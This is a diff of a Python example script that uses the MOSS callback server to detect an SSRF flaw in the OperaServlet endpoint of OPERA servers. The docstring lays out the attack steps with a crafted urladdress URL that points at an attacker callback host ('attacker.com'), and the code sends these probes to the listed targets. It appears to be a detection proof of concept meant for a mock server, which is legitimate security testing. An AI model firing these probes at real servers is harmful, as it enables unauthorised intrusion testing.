@@ -1,13 +1,25 @@
 """
 SSRF callback detector — demonstrates using MOSS as a library.
 
-Sends SSRF probes that mimic an OperaServlet SSRF trigger.  The
-correlation ID is passed as the urlparams query parameter in the
-OperaServlet URL; the target echoes it back in the callback body.
+Sends SSRF probes that mimic an OperaServlet SSRF trigger. The
+correlation ID is passed and echoed in the URL path of the SSRF request.
+
+1. Attacker starts a MOSS server with `--filter keyword --correlation 'xyz.*zyx'`
+
+2. Attacker sends https://TARGET/OperaLogin/OperaServlet?urladdress=http://MOSS/keyword/xyz{correlation}zyx
+   to the victim.
+
+3. Victim OPERA server makes a HTTP request to http://MOSS/keyword/xyz{correlation}zyx.
+
+4. Request is received by MOSS.
+
+5. Event is polled and seen by the script.
+
+NOTE: The PoC is for educational purposes only and meant to be used with mock_opera_server.py.
 
 Usage:
-    python examples/cve_2026_21967.py --hostname example.com --target targets.txt
-    python examples/cve_2026_21967.py --hostname example.com --target x.com --target y.com
+    python examples/cve_2026_21967.py --lhost attacker.com --target targets.txt
+    python examples/cve_2026_21967.py --lhost attacker.com --target example.com
 """
 
 import sys
@@ -17,7 +29,6 @@ import httpx
 import ssl
 import argparse
 import re
-import csv
 
 from moss.moss import MossBuilder
 
@@ -96,8 +107,8 @@ class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsH
 def main():
     parser = argparse.ArgumentParser(description="SSRF callback detector", formatter_class=Formatter)
     parser.add_argument("-p", "--port", type=int, default=8000, help="MOSS listen port")
-    parser.add_argument("--hostname", default="localhost", metavar="HOST",
-                        help="Public hostname for callback URL")
+    parser.add_argument("--lhost", default="127.0.0.1", metavar="HOST",
+                        help="Public host for callback URL")
     parser.add_argument("--timeout", type=int, default=5,
                         help="Seconds to wait for callbacks")
     parser.add_argument("-t", "--target", required=True, action="append", metavar="URL_OR_FILE",
@@ -145,7 +156,7 @@ def main():
         "--filter", "userid",
         "--correlation", fr"({prefix}\w{{{8}}}{suffix})",
     ]
-    moss_args += ["--hostname", args.hostname]
+    moss_args += ["--hostname", args.lhost]
 
     builder = MossBuilder(args=moss_args)
     runner = builder.api()
@@ -154,15 +165,15 @@ def main():
     server = runner.servers[0]
 
     capture = SsrfCaptureHandler()
-    hostname = args.hostname
+    lhost = args.lhost
     default_scheme = "http"
-    print(f"SSRF detector listening on {default_scheme}://{hostname}:{args.port}")
+    print(f"SSRF detector listening on {default_scheme}://{lhost}:{args.port}")
     print(f"Targeting {len(targets)} endpoint(s)")
     print()
 
     for t in targets:
         sid = correlations[t]
-        send_request(t, f"{default_scheme}://{hostname}:{args.port}", sid)
+        send_request(t, f"{default_scheme}://{lhost}:{args.port}", sid)
         
         # Poll each iteration to offload events from the event queue.
         while (event := server.wait(0)) is not None:
